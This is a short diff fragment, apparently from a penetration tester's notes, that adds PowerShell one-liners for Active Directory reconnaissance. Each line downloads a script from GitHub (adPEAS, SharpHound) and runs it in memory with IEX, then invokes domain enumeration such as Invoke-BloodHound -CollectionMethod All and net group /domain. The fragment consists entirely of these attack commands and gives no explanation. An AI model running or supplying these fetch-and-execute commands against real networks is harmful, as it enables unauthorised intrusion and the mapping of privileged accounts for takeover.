@@ -4,3 +4,12 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1'); net group /domain
+Invoke-adPEAS
+
+
+> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
+> Invoke-BloodHound -CollectionMethod All
+
+
+> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
+> Invoke-BloodHound -CollectionMethod All
